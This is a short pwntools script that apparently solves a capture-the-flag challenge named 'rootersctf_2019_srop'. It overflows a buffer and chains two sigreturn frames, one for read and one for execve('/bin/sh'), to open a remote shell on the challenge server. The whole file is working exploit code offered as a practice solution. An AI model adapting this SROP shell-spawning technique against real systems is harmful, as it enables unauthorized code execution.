from pwn import *


# p = process("./rootersctf_2019_srop")
p = remote("node4.buuoj.cn", 29448)


pop_rax_syscall = 0x0401032
syscall = 0x0401033 
data_addr = 0x0402000

context.arch = "amd64"

# execve("/bin/sh\x00")
frame1 = SigreturnFrame()
frame1.rax = constants.SYS_execve
frame1.rdi = data_addr
frame1.rsi = 0
frame1.rdx = 0
frame1.rip = syscall 

exe_sh = p64(pop_rax_syscall)+p64(15)+bytes(frame1)

# read(0, data_addr, "/bin/sh\x00"+exe_sh)
frame2 = SigreturnFrame()
frame2.rax = constants.SYS_read
frame2.rdi = 0
frame2.rsi = data_addr 
frame2.rdx = len(exe_sh)+0x8 
frame2.rip = syscall
frame2.rbp = data_addr 

# attack
pad = cyclic(0x80+0x8)
pad += p64(pop_rax_syscall)+p64(15)
pad += bytes(frame2)
p.send(pad)

pad = b"/bin/sh\x00"+exe_sh
p.send(pad)

p.interactive()


